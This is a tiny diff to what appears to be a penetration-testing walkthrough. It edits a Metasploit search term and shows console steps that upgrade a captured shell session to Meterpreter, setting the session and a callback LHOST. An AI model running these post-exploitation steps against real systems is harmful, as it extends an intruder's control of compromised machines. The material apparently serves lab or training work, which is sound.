@@ -54,7 +54,7 @@ run
 ```bash
 background
 sessions
-search shell_to_meterpreter
+search _meterpreter
 use post/multi/manage/shell_to_meterpreter
 set SESSION 2
 set LHOST eth1
